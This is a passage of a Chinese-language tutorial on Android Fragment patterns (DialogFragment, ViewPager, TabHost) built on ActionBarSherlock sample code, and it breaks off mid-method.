Dialog是一种自治的实体， 它们拥有自己的窗口， 自己的输入时间， 并且知道自己何时消失。
```
DialogFragment needs to ensure that what is happening with the Fragment and Dialog states remains consistent. To do this, it watches for dismiss events from the dialog and takes are of removing its own state when they happen. This means you should use show(FragmentManager, String) or show(FragmentTransaction, String) to add an instance of DialogFragment to your UI, as these keep track of how DialogFragment should remove itself when the dialog is dismissed.
# Basic Dialog
最简单的Dialog, 就是浮动在ViewHierarchy上的一个容器。建立这样的Dialog你需要:
 1. 继承DialogFragment或SherlockDialogFragment
 2. 在`onCreateView`方法中载入UI.
注意这里并没有任何Dialog对象产生。
```java
	public static class MyDialogFragment extends SherlockDialogFragment {
		static MyDialogFragment newInstance() {
			return new MyDialogFragment();
		}
		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
			View v = inflater.inflate(R.layout.hello_world, container, false);
			View tv = v.findViewById(R.id.text);
			((TextView) tv).setText("This is an instance of MyDialogFragment");
			return v;
		}
	}
```
显示对话框:
```java
	void showDialog() {
		// Create the fragment and show it as a dialog.
		DialogFragment newFragment = MyDialogFragment.newInstance();
		newFragment.show(getSupportFragmentManager(), "dialog");
	}
```
# Alert Dialog
AlertDialog特别之处在于，通过重写`onCreateDialog`方法来初始化Dialog对象。
实现对话框Fragement:
```java
	public class MyAlertDialogFragment extends SherlockDialogFragment {
		public static MyAlertDialogFragment newInstance(int title) {
			MyAlertDialogFragment frag = new MyAlertDialogFragment();
			Bundle args = new Bundle();
			args.putInt("title", title);
			frag.setArguments(args);
			return frag;
		}
		@Override
		public Dialog onCreateDialog(Bundle savedInstanceState) {
			int title = getArguments().getInt("title");
			return new AlertDialog.Builder(getActivity()).setIcon(R.drawable.alert_dialog_icon).setTitle(title)
			        .setPositiveButton(R.string.alert_dialog_ok, new DialogInterface.OnClickListener() {
				        public void onClick(DialogInterface dialog, int whichButton) {
					        ((FragmentAlertDialogSupport) getActivity()).doPositiveClick(); // 可以在Activity中添加此回调, 处理主按钮点击
				        }
			        }).setNegativeButton(R.string.alert_dialog_cancel, new DialogInterface.OnClickListener() {
				        public void onClick(DialogInterface dialog, int whichButton) {
					        ((FragmentAlertDialogSupport) getActivity()).doNegativeClick(); // 可以在Activity中添加此回调, 处理副按钮点击
				        }
			        }).create();
		}
	}
```
显示对话框:
```java
	void showDialog() {
		DialogFragment newFragment = MyAlertDialogFragment.newInstance(R.string.title);
		newFragment.show(getSupportFragmentManager(), "dialog");
	}
```
# DialogFragment可弹出，可嵌入
DialogFragment的展现方式可以弹出，也可以嵌入。 这样你就可以在小屏幕上弹出Dialog, 在大屏幕上则在富余的空间里嵌入Dialog.
```
public class FragmentDialogOrActivitySupport extends SherlockFragmentActivity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.fragment_dialog_or_activity);
        // 嵌入对话框, 通过FragmentTransaction方式添加
		if (savedInstanceState == null) {
			// First-time init; create fragment to embed in activity.
			FragmentTransaction ft = getSupportFragmentManager().beginTransaction();
			DialogFragment newFragment = MyDialogFragment.newInstance();
			ft.add(R.id.embedded, newFragment);
			ft.commit();
		}
	}
    // 弹出对话框， 直接调用DialogFragment的show方法
	void showDialog() {
		DialogFragment newFragment = MyDialogFragment.newInstance();
		newFragment.show(getSupportFragmentManager(), "dialog");
	}
    // 同样的DialogFragment, 展现形式可弹出，可嵌入，一菜两吃
	public static class MyDialogFragment extends SherlockDialogFragment {
		static MyDialogFragment newInstance() {
			return new MyDialogFragment();
		}
		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
			View v = inflater.inflate(R.layout.hello_world, container, false);
			View tv = v.findViewById(R.id.text);
			((TextView) tv).setText("This is an instance of MyDialogFragment");
			return v;
		}
	}
}
```
# 设置对话框样式: setStyle()
 * DialogFragment.STYLE_NO_TITLE;
 *  DialogFragment.STYLE_NO_FRAME;
 * DialogFragment.STYLE_NO_INPUT;
 * DialogFragment.STYLE_NORMAL;
 * DialogFragment.STYLE_NO_TITLE;
 * DialogFragment.STYLE_NO_FRAME;
 * DialogFragment.STYLE_NORMAL
;
# 通过XML属性向Fragment传递参数
定义属性:
```
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <declare-styleable name="FragmentArguments">
        <attr name="android:label" />
    </declare-styleable>
</resources>
```
在View中嵌入fragment:
```
        <fragment
            android:id="@+id/embedded"
            android:layout_width="0px"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            class="com.actionbarsherlock.sample.fragments.FragmentArgumentsSupport$MyFragment"
            android:label="@string/fragment_arguments_embedded" />
```
```
public static class MyFragment extends SherlockFragment {
		CharSequence mLabel;
        // 静态实例化方法
		static MyFragment newInstance(CharSequence label) {
			MyFragment f = new MyFragment();
			Bundle b = new Bundle();
			b.putCharSequence("label", label);
			f.setArguments(b);
			return f;
		}
        // 从XML中获得参数
		@Override
		public void onInflate(Activity activity, AttributeSet attrs, Bundle savedInstanceState) {
			super.onInflate(activity, attrs, savedInstanceState);
			TypedArray a = activity.obtainStyledAttributes(attrs, R.styleable.FragmentArguments);
			mLabel = a.getText(R.styleable.FragmentArguments_android_label);
			a.recycle();
		}
        // 通常我们使用的从Bundle中获得参数
		@Override
		public void onCreate(Bundle savedInstanceState) {
			super.onCreate(savedInstanceState);
			Bundle args = getArguments();
			if (args != null) {
				CharSequence label = args.getCharSequence("label");
				if (label != null) {
					mLabel = label;
				}
			}
		}
        // 
		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
			View v = inflater.inflate(R.layout.hello_world, container, false);
			View tv = v.findViewById(R.id.text);
			((TextView) tv).setText(mLabel != null ? mLabel : "(no label)");
			tv.setBackgroundDrawable(getResources().getDrawable(android.R.drawable.gallery_thumb));
			return v;
		}
	}
```
# 上下文菜单
可以将上下文菜单及其处理逻辑封装到Fragment中:
 
```java
    public class ContextMenuFragment extends SherlockFragment {
        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
            View root = inflater.inflate(R.layout.fragment_context_menu, container, false);
            // 注册上下文菜单，使之与某个View关联，长按这个View的时候弹出上下文菜单
            registerForContextMenu(root.findViewById(R.id.long_press));
            return root;
        }
        @Override
        public void onCreateContextMenu(ContextMenu menu, View v, ContextMenuInfo menuInfo) {
            super.onCreateContextMenu(menu, v, menuInfo);
            menu.add(Menu.NONE, R.id.a_item, Menu.NONE, "Menu A");
            menu.add(Menu.NONE, R.id.b_item, Menu.NONE, "Menu B");
        }
        @Override
        public boolean onContextItemSelected(MenuItem item) {
            switch (item.getItemId()) {
                case R.id.a_item:
                    Log.i("ContextMenu", "Item 1a was chosen");
                    return true;
                case R.id.b_item:
                    Log.i("ContextMenu", "Item 1b was chosen");
                    return true;
            }
            return super.onContextItemSelected(item);
        }
    }
```
# 自定义切换动画
```java
		Fragment newFragment = CountingFragment.newInstance(mStackLevel);
		// Add the fragment to the activity, pushing this transaction
		// on to the back stack.
		FragmentTransaction ft = getSupportFragmentManager().beginTransaction();
		ft.setCustomAnimations(R.anim.fragment_slide_left_enter, R.anim.fragment_slide_left_exit, R.anim.fragment_slide_right_enter,
		        R.anim.fragment_slide_right_exit);
		ft.replace(R.id.simple_fragment, newFragment);
		ft.addToBackStack(null);
		ft.commit();
```
其实有2个函数可以控制Fragement出入的动画:
```java
	/**
	 * Set specific animation resources to run for the fragments that are
	 * entering and exiting in this transaction. These animations will not be
	 * played when popping the back stack.
	 */
	public abstract FragmentTransaction setCustomAnimations(int enter, int exit);
	/**
	 * Set specific animation resources to run for the fragments that are
	 * entering and exiting in this transaction. The <code>popEnter</code> and
	 * <code>popExit</code> animations will be played for enter/exit operations
	 * specifically when popping the back stack.
	 */
	public abstract FragmentTransaction setCustomAnimations(int enter, int exit, int popEnter, int popExit);
```
# 显示/隐藏 Fragment
除了将fragment移除之外，还可以通过隐藏的方式使之不可见.
```java
    FragmentTransaction ft = getSupportFragmentManager().beginTransaction();
    ft.setCustomAnimations(android.R.anim.fade_in, android.R.anim.fade_out);
	if (fragment.isHidden()) {
		ft.show(fragment);
	} else {
		ft.hide(fragment);
	}
    ft.commit();
```
# 大尺寸屏幕上采用Fragment，而小尺寸屏幕上使用Activity
layout/fragment_layout_support
```xml
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent" android:layout_height="match_parent">
    <fragment class="com.actionbarsherlock.sample.fragments.FragmentLayoutSupport$TitlesFragment"
            android:id="@+id/titles"
            android:layout_width="match_parent" android:layout_height="match_parent" />
</FrameLayout>
```
layout-land/fragment_layout_support:
横屏尺寸更大，所以原来通过另一个Activity容纳的UI, 可以合并到一屏中。
```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="horizontal"
    android:layout_width="match_parent" android:layout_height="match_parent">
    <fragment class="com.actionbarsherlock.sample.fragments.FragmentLayoutSupport$TitlesFragment"
            android:id="@+id/titles" android:layout_weight="1"
            android:layout_width="0px" android:layout_height="match_parent" />
    <FrameLayout android:id="@+id/details" android:layout_weight="1"
            android:layout_width="0px" android:layout_height="match_parent" />
</LinearLayout>
```
```java
 * Copyright (C) 2010 The Android Open Source Project
package com.actionbarsherlock.sample.fragments;
import android.content.Intent;
/**
 * Demonstration of using fragments to implement different activity layouts.
 * This sample provides a different layout (and activity flow) when run in
 * landscape.
 */
public class FragmentLayoutSupport extends SherlockFragmentActivity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		setTheme(SampleList.THEME); //Used for theme switching in samples
		super.onCreate(savedInstanceState);
		setContentView(R.layout.fragment_layout_support);
	}
	/**
	 * This is a secondary activity, to show what the user has selected when the
	 * screen is not large enough to show it all in one activity.
	 */
	public static class DetailsActivity extends SherlockFragmentActivity {
		@Override
		protected void onCreate(Bundle savedInstanceState) {
			setTheme(SampleList.THEME); //Used for theme switching in samples
			super.onCreate(savedInstanceState);
			if (getResources().getConfiguration().orientation == Configuration.ORIENTATION_LANDSCAPE) {
				// If the screen is now in landscape mode, we can show the
				// dialog in-line with the list so we don't need this activity.
				finish();
				return;
			}
			if (savedInstanceState == null) {
				// During initial setup, plug in the details fragment.
				DetailsFragment details = new DetailsFragment();
				details.setArguments(getIntent().getExtras());
				getSupportFragmentManager().beginTransaction().add(android.R.id.content, details).commit();
			}
		}
	}
	/**
	 * This is the "top-level" fragment, showing a list of items that the user
	 * can pick. Upon picking an item, it takes care of displaying the data to
	 * the user as appropriate based on the currrent UI layout.
	 */
	public static class TitlesFragment extends SherlockListFragment {
		boolean mDualPane;
		int mCurCheckPosition = 0;
		@Override
		public void onActivityCreated(Bundle savedInstanceState) {
			super.onActivityCreated(savedInstanceState);
			// Populate list with our static array of titles.
			setListAdapter(new ArrayAdapter<String>(getActivity(), R.layout.simple_list_item_checkable_1, android.R.id.text1, Shakespeare.TITLES));
			// Check to see if we have a frame in which to embed the details
			// fragment directly in the containing UI.
			View detailsFrame = getActivity().findViewById(R.id.details);
			mDualPane = detailsFrame != null && detailsFrame.getVisibility() == View.VISIBLE;
			if (savedInstanceState != null) {
				// Restore last state for checked position.
				mCurCheckPosition = savedInstanceState.getInt("curChoice", 0);
			}
			if (mDualPane) {
				// In dual-pane mode, the list view highlights the selected item.
				getListView().setChoiceMode(ListView.CHOICE_MODE_SINGLE);
				// Make sure our UI is in the correct state.
				showDetails(mCurCheckPosition);
			}
		}
		@Override
		public void onSaveInstanceState(Bundle outState) {
			super.onSaveInstanceState(outState);
			outState.putInt("curChoice", mCurCheckPosition);
		}
		@Override
		public void onListItemClick(ListView l, View v, int position, long id) {
			showDetails(position);
		}
		/**
		 * Helper function to show the details of a selected item, either by
		 * displaying a fragment in-place in the current UI, or starting a whole
		 * new activity in which it is displayed.
		 */
		void showDetails(int index) {
			mCurCheckPosition = index;
			if (mDualPane) {
				// We can display everything in-place with fragments, so update
				// the list to highlight the selected item and show the data.
				getListView().setItemChecked(index, true);
				// Check what fragment is currently shown, replace if needed.
				DetailsFragment details = (DetailsFragment) getFragmentManager().findFragmentById(R.id.details);
				if (details == null || details.getShownIndex() != index) {
					// Make new fragment to show this selection.
					details = DetailsFragment.newInstance(index);
					// Execute a transaction, replacing any existing fragment
					// with this one inside the frame.
					FragmentTransaction ft = getFragmentManager().beginTransaction();
					ft.replace(R.id.details, details);
					ft.setTransition(FragmentTransaction.TRANSIT_FRAGMENT_FADE);
					ft.commit();
				}
			} else {
				// Otherwise we need to launch a new activity to display
				// the dialog fragment with selected text.
				Intent intent = new Intent();
				intent.setClass(getActivity(), DetailsActivity.class);
				intent.putExtra("index", index);
				startActivity(intent);
			}
		}
	}
	/**
	 * This is the secondary fragment, displaying the details of a particular
	 * item.
	 */
	public static class DetailsFragment extends SherlockFragment {
		/**
		 * Create a new instance of DetailsFragment, initialized to show the
		 * text at 'index'.
		 */
		public static DetailsFragment newInstance(int index) {
			DetailsFragment f = new DetailsFragment();
			// Supply index input as an argument.
			Bundle args = new Bundle();
			args.putInt("index", index);
			f.setArguments(args);
			return f;
		}
		public int getShownIndex() {
			return getArguments().getInt("index", 0);
		}
		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
			if (container == null) {
				// We have different layouts, and in one of them this
				// fragment's containing frame doesn't exist.  The fragment
				// may still be created from its saved state, but there is
				// no reason to try to create its view hierarchy because it
				// won't be displayed.  Note this is not needed -- we could
				// just run the code below, where we would create and return
				// the view hierarchy; it would just never be used.
				return null;
			}
			ScrollView scroller = new ScrollView(getActivity());
			TextView text = new TextView(getActivity());
			int padding = (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 4, getActivity().getResources().getDisplayMetrics());
			text.setPadding(padding, padding, padding, padding);
			scroller.addView(text);
			text.setText(Shakespeare.DIALOGUE[getShownIndex()]);
			return scroller;
		}
	}
}
```
# ListFragment
```java
public class FragmentListArraySupport extends SherlockFragmentActivity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		// Create the list fragment and add it as our sole content.
		if (getSupportFragmentManager().findFragmentById(android.R.id.content) == null) {
			ArrayListFragment list = new ArrayListFragment();
			getSupportFragmentManager().beginTransaction().add(android.R.id.content, list).commit();
		}
	}
	public static class ArrayListFragment extends SherlockListFragment {
		@Override
		public void onActivityCreated(Bundle savedInstanceState) {
			super.onActivityCreated(savedInstanceState);
			setListAdapter(new ArrayAdapter<String>(getActivity(), android.R.layout.simple_list_item_1, Shakespeare.TITLES));
		}
		@Override
		public void onListItemClick(ListView l, View v, int position, long id) {
			Log.i("FragmentList", "Item clicked: " + id);
		}
	}
}
```
# 将ActionItem封装到Fragment中
```java
	public static class MenuFragmentA extends SherlockFragment {
		@Override
		public void onCreate(Bundle savedInstanceState) {
			super.onCreate(savedInstanceState);
			setHasOptionsMenu(true);
		}
		@Override
		public void onCreateOptionsMenu(Menu menu, MenuInflater inflater) {
			menu.add("Menu A1").setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
			menu.add("Menu A2").setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
		}
	}
   	public static class MenuFragmentB extends SherlockFragment {
		@Override
		public void onCreate(Bundle savedInstanceState) {
			super.onCreate(savedInstanceState);
			setHasOptionsMenu(true);
		}
		@Override
		public void onCreateOptionsMenu(Menu menu, MenuInflater inflater) {
			menu.add("Menu B1").setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
			menu.add("Menu B2").setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
		}
	}
```
```java
public class FragmentMenuSupport extends SherlockFragmentActivity {
    ...
    Fragment mFragmentMenuA = null;
    Fragment mFragmentMenuB = null;
    ...
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.fragment_menu);
		// 初次加载
		FragmentManager fm = getSupportFragmentManager();
		FragmentTransaction ft = fm.beginTransaction();
		mFragmentA = fm.findFragmentByTag("fmenuA");
		if (mFragmentA == null) {
			mFragmentA = new MenuFragmentA();
			ft.add(mFragmentA, "fmenuA");
		}
		mFragmentB = fm.findFragmentByTag("fmenuB");
		if (mFragmentB == null) {
			mFragmentB = new MenuFragmentB();
			ft.add(mFragmentB, "fmenuB");
		}
		ft.commit();
        addActionMenuA();
	}
    private void addActionMenuA() {
		FragmentTransaction ft = getSupportFragmentManager().beginTransaction();
	    ft.show(mFragmentMenuA);
		ft.commit();
    }
   ...
}
```
# 分页显示: Pager + Fragment 
分页显示是一种非常友好的展示方法， 通过ViewPager + Fragment我们可以实现这样的效果。
1. 初始化工作, ViewPager类似于ListView, 通过Adpter控制子页面，因此必须实现一个Adapter.
```java
public class FragmentPagerSupport extends SherlockFragmentActivity {
	static final int NUM_ITEMS = 10;
	MyAdapter mAdapter;
	ViewPager mPager;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.fragment_pager);
		mAdapter = new MyAdapter(getSupportFragmentManager());
		mPager = (ViewPager) findViewById(R.id.pager);
		mPager.setAdapter(mAdapter);
	}
  ...
}
```
2. Adapter返回的对象即为Fragment, 分页最关键的参数就是页数，所以每个Fragment对应一个子页，页码在初始化时传入Fragment.
!MyAdapter: 
```java
  public static class MyAdapter extends FragmentPagerAdapter {
		public MyAdapter(FragmentManager fm) {
			super(fm);
		}
		@Override
		public int getCount() {
			return NUM_ITEMS;
		}
		@Override
		public Fragment getItem(int position) {
			return ArrayListFragment.newInstance(position);
		}
	}
```
3. 子页的逻辑处理都在Fragment中完成
!ArrayListFragment:
```java
	public static class ArrayListFragment extends SherlockListFragment {
		int mNum;
		/**
		 * Create a new instance of CountingFragment, providing "num" as an
		 * argument.
		 */
		static ArrayListFragment newInstance(int num) {
			ArrayListFragment f = new ArrayListFragment();
			// Supply num input as an argument.
			Bundle args = new Bundle();
			args.putInt("num", num);
			f.setArguments(args);
			return f;
		}
		/**
		 * When creating, retrieve this instance's number from its arguments.
		 */
		@Override
		public void onCreate(Bundle savedInstanceState) {
			super.onCreate(savedInstanceState);
			mNum = getArguments() != null ? getArguments().getInt("num") : 1;
		}
		/**
		 * The Fragment's UI is just a simple text view showing its instance
		 * number.
		 */
		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
			View v = inflater.inflate(R.layout.fragment_pager_list, container, false);
			View tv = v.findViewById(R.id.text);
			((TextView) tv).setText("Fragment #" + mNum);
			return v;
		}
		@Override
		public void onActivityCreated(Bundle savedInstanceState) {
			super.onActivityCreated(savedInstanceState);
			setListAdapter(new ArrayAdapter<String>(getActivity(), android.R.layout.simple_list_item_1, Cheeses.sCheeseStrings));
		}
		@Override
		public void onListItemClick(ListView l, View v, int position, long id) {
			Log.i("FragmentList", "Item clicked: " + id);
		}
	}
```
# 在Fragment中处理Activity的返回结果
常常需要从其他Activity获得一些结果，比方说从联系人应用获得一些联系人，等等。当然地球人都知道在Activity的onActivityForResult()中处理返回结果。
现在这些功能可以封装到Fragment中。
```java
public static class ReceiveResultFragment extends SherlockFragment {
		// Definition of the one requestCode we use for receiving resuls.
		static final private int REQUEST_CODE_GET = 0;
		private OnClickListener _ = new OnClickListener() {
			public void onClick(View v) {
				Intent intent = new Intent(getActivity(), SendResult.class);
				startActivityForResult(intent, GET_CODE);
			}
		};
		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
           View root = inflater.inflate(R.layout.contentview, container, false);
           ...
           Button btnGetData = (Button)findViewById(R.id.btn);
           btnGetData.setOnClickListener(_);
		}
		/**
		 * This method is called when the sending activity has finished, with
		 * the result it supplied.
		 */
		@Override
		public void onActivityResult(int requestCode, int resultCode, Intent data) {
			if (requestCode == REQUEST_CODE_GET) {
               // 在这里处理返回结果吧
			}
		}
	}
```
# 保存Fragment的状态
我们可以将不被打断的任务封装到一个Fragment中， UI则封装到另一个Fragment中。 当UI需要发生变化时，比如手机屏幕切换， UI Fragment销毁，重建，
重建后寻找不被销毁的任务Fragment.
```java
	/**
	 * This is a fragment showing UI that will be updated from work done in the
	 * retained fragment.
	 */
	public static class UiFragment extends SherlockFragment {
		RetainedFragment mWorkFragment;
		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
            ...
		}
		@Override
		public void onActivityCreated(Bundle savedInstanceState) {
			super.onActivityCreated(savedInstanceState);
			FragmentManager fm = getFragmentManager();
			// Check to see if we have retained the worker fragment.
			mWorkFragment = (RetainedFragment) fm.findFragmentByTag("work");
			// If not retained (or first time running), we need to create it.
			if (mWorkFragment == null) {
				mWorkFragment = new RetainedFragment();
				// Tell it who it is working with.
				mWorkFragment.setTargetFragment(this, 0);
				fm.beginTransaction().add(mWorkFragment, "work").commit();
			}
        }
    }
```
```java
	public static class RetainedFragment extends SherlockFragment {
        ...
		@Override
		public void onCreate(Bundle savedInstanceState) {
			super.onCreate(savedInstanceState);
            // 告诉framework保存这类fragment， 比如： 当进行横竖屏切换时，Activity需要重建，但是Fragment可以不用重建。
			setRetainInstance(true);
		}
        ...
   }
```
# PreferenceFragment
# TabHost + Fragment
我们知道TabHost本身只支持在多个Activity之间，或多个View之间进行切换。 现在我们想让TabHost在多个Fragment之间切换。这需要使用一个小小的技巧。
```xml
<TabHost
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@android:id/tabhost"
    android:layout_width="match_parent"
    android:layout_height="match_parent">
    <LinearLayout
        android:orientation="vertical"
        android:layout_width="match_parent"
        android:layout_height="match_parent">
        <TabWidget
            android:id="@android:id/tabs"
            android:orientation="horizontal"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_weight="0"/>
        <!- -假容器，站坐儿用 -->
        <FrameLayout
            android:id="@android:id/tabcontent"
            android:layout_width="0dp"
            android:layout_height="0dp"
            android:layout_weight="0"/>
        <!-- 真正的容器，各种Fragment就往这里面装了 -->
        <FrameLayout
            android:id="@+android:id/realtabcontent"
            android:layout_width="match_parent"
            android:layout_height="0dp"
            android:layout_weight="1"/>
    </LinearLayout>
</TabHost>
```
```java
public class FragmentTabs extends SherlockFragmentActivity {
	TabHost mTabHost;
	TabManager mTabManager;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.fragment_tabs);
		mTabHost = (TabHost) findViewById(android.R.id.tabhost);
		mTabHost.setup();
        
        // 真正的容器
		mTabManager = new TabManager(this, mTabHost, R.id.realtabcontent);
		mTabManager.addTab(mTabHost.newTabSpec("simple").setIndicator("Simple"), FragmentStackSupport.CountingFragment.class, null);
		mTabManager.addTab(mTabHost.newTabSpec("contacts").setIndicator("Contacts"), LoaderCursorSupport.CursorLoaderListFragment.class, null);
		mTabManager.addTab(mTabHost.newTabSpec("custom").setIndicator("Custom"), LoaderCustomSupport.AppListFragment.class, null);
		mTabManager.addTab(mTabHost.newTabSpec("throttle").setIndicator("Throttle"), LoaderThrottleSupport.ThrottledLoaderListFragment.class, null);
		if (savedInstanceState != null) {
			mTabHost.setCurrentTabByTag(savedInstanceState.getString("tab"));
		}
	}
    ...
}
```
重点在于TabManager:
TabHost本身有两个方法，可以接受View或者Intent作为Tab页切换的参数。 但是Fragment就不行用了，这里的小技巧在于
使用高度为0的View作为Tab的导航参数，实际上只是一个PlaceHolder, 而在接受到Tab页发生变化的通知时，挂羊头买狗肉，
将相应的Fragment装到真正的容器中。
```java
public static class TabManager implements TabHost.OnTabChangeListener {
		private final FragmentActivity mActivity;
		private final TabHost mTabHost;
		private final int mContainerId;
		private final HashMap<String, TabInfo> mTabs = new HashMap<String, TabInfo>();
		TabInfo mLastTab;
		static final class TabInfo {
			private final String tag;
			private final Class<?> clss;
			private final Bundle args;
			private Fragment fragment;
			TabInfo(String _tag, Class<?> _class, Bundle _args) {
				tag = _tag;
				clss = _class;
				args = _args;
			}
		}
		static class DummyTabFactory implements TabHost.TabContentFactory {
			private final Context mContext;
			public DummyTabFactory(Context context) {
				mContext = context;
			}
			@Override
			public View createTabContent(String tag) {
				View v = new View(mContext);
				v.setMinimumWidth(0);
				v.setMinimumHeight(0);
				return v;
			}
		}
		public TabManager(FragmentActivity activity, TabHost tabHost, int containerId) {
			mActivity = activity;
			mTabHost = tabHost;
			mContainerId = containerId;
			mTabHost.setOnTabChangedListener(this);
		}
		public void addTab(TabHost.TabSpec tabSpec, Class<?> clss, Bundle args) {
            // 站个坐先
			tabSpec.setContent(new DummyTabFactory(mActivity));
			String tag = tabSpec.getTag();
			TabInfo info = new TabInfo(tag, clss, args);
			// Check to see if we already have a fragment for this tab, probably
			// from a previously saved state.  If so, deactivate it, because our
			// initial state is that a tab isn't shown.
			info.fragment = mActivity.getSupportFragmentManager().findFragmentByTag(tag);
			if (info.fragment != null && !info.fragment.isDetached()) {
				FragmentTransaction ft = mActivity.getSupportFragmentManager().beginTransaction();
				ft.detach(info.fragment);
				ft.commit();
			}
			mTabs.put(tag, info);
			mTabHost.addTab(tabSpec);
		}
		@Override
		public void onTabChanged(String tabId) {
			TabInfo newTab = mTabs.get(tabId);
			if (mLastTab != newTab) {
				FragmentTransaction ft = mActivity.getSupportFragmentManager().beginTransaction();
				if (mLastTab != null) {
					if (mLastTab.fragment != null) {
						ft.detach(mLastTab.fragment);
					}
				}
				if (newTab != null) {
					if (newTab.fragment == null) {
						newTab.fragment = Fragment.instantiate(mActivity, newTab.clss.getName(), newTab.args);
						ft.add(mContainerId, newTab.fragment, newTab.tag);
					} else {
						ft.attach(newTab.fragment);
					}
				}
				mLastTab = newTab;
				ft.commit();
				mActivity.getSupportFragmentManager().executePendingTransactions();
			}
		}
	}
```
# TabHost + ViewPager + Fragment
现在我们来看一个更高级的用法， 跟上个例子比，这回可以使用ViewPager来做Tab页之间的切换。
```java
<TabHost
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@android:id/tabhost"
    android:layout_width="match_parent"
    android:layout_height="match_parent">
    <LinearLayout
        android:orientation="vertical"
        android:layout_width="match_parent"
        android:layout_height="match_parent">
        <TabWidget
            android:id="@android:id/tabs"
            android:orientation="horizontal"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_weight="0"/>
        <FrameLayout
            android:id="@android:id/tabcontent"
            android:layout_width="0dp"
            android:layout_height="0dp"
            android:layout_weight="0"/>
        <android.support.v4.view.ViewPager
            android:id="@+id/pager"
            android:layout_width="match_parent"
            android:layout_height="0dp"
            android:layout_weight="1"/>
    </LinearLayout>
</TabHost>
```
1. 如果是点击TabHost进行切换， 则TabHost通知ViewPager切换到相应的子页。
2. 如果是通过ViewPager进行切换，则ViewPager通知TabHost将TabWidget到相应的Tab上。
```java
public class FragmentTabsPager extends SherlockFragmentActivity {
	TabHost mTabHost;
	ViewPager mViewPager;
	TabsAdapter mTabsAdapter;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.fragment_tabs_pager);
		mTabHost = (TabHost) findViewById(android.R.id.tabhost);
		mTabHost.setup();
		mViewPager = (ViewPager) findViewById(R.id.pager);
        
		mTabsAdapter = new TabsAdapter(this, mTabHost, mViewPager);
		mTabsAdapter.addTab(mTabHost.newTabSpec("simple").setIndicator("Simple"), FragmentStackSupport.CountingFragment.class, null);
		mTabsAdapter.addTab(mTabHost.newTabSpec("contacts").setIndicator("Contacts"), LoaderCursorSupport.CursorLoaderListFragment.class, null);
		mTabsAdapter.addTab(mTabHost.newTabSpec("custom").setIndicator("Custom"), LoaderCustomSupport.AppListFragment.class, null);
		mTabsAdapter.addTab(mTabHost.newTabSpec("throttle").setIndicator("Throttle"), LoaderThrottleSupport.ThrottledLoaderListFragment.class, null);
		if (savedInstanceState != null) {
			mTabHost.setCurrentTabByTag(savedInstanceState.getString("tab"));
		}
	}
	@Override
	protected void onSaveInstanceState(Bundle outState) {
		super.onSaveInstanceState(outState);
        // 保存当前正在使用哪个Tab页
		outState.putString("tab", mTabHost.getCurrentTabTag());
	}
    
	public static class TabsAdapter extends FragmentPagerAdapter implements TabHost.OnTabChangeListener, ViewPager.OnPageChangeListener {
		private final Context mContext;
		private final TabHost mTabHost;
		private final ViewPager mViewPager;
		private final ArrayList<TabInfo> mTabs = new ArrayList<TabInfo>();
		static final class TabInfo {
			private final String tag;
			private final Class<?> clss;
			private final Bundle args;
			TabInfo(String _tag, Class<?> _class, Bundle _args) {
				tag = _tag;
				clss = _class;
				args = _args;
			}
		}
		static class DummyTabFactory implements TabHost.TabContentFactory {
			private final Context mContext;
			public DummyTabFactory(Context context) {
				mContext = context;
			}
			@Override
			public View createTabContent(String tag) {
				View v = new View(mContext);
				v.setMinimumWidth(0);
				v.setMinimumHeight(0);
				return v;
			}
		}
		public TabsAdapter(FragmentActivity activity, TabHost tabHost, ViewPager pager) {
			super(activity.getSupportFragmentManager());
			mContext = activity;
			mTabHost = tabHost;
			mViewPager = pager;
			mTabHost.setOnTabChangedListener(this);
            // 向ViewPager中装入子页面
			mViewPager.setAdapter(this);
            
            // ViewPager中的事件通知到TabsAdapter
			mViewPager.setOnPageChangeListener(this);
		}
		public void addTab(TabHost.TabSpec tabSpec, Class<?> clss, Bundle args) {
			tabSpec.setContent(new DummyTabFactory(mContext));
			String tag = tabSpec.getTag();
			TabInfo info = new TabInfo(tag, clss, args);
			mTabs.add(info);
			mTabHost.addTab(tabSpec);
			notifyDataSetChanged();
		}
		@Override
		public int getCount() {
			return mTabs.size();
		}
		@Override
		public Fragment getItem(int position) {
			TabInfo info = mTabs.get(position);
			return Fragment.instantiate(mContext, info.clss.getName(), info.args);
		}
		@Override
		public void onTabChanged(String tabId) {
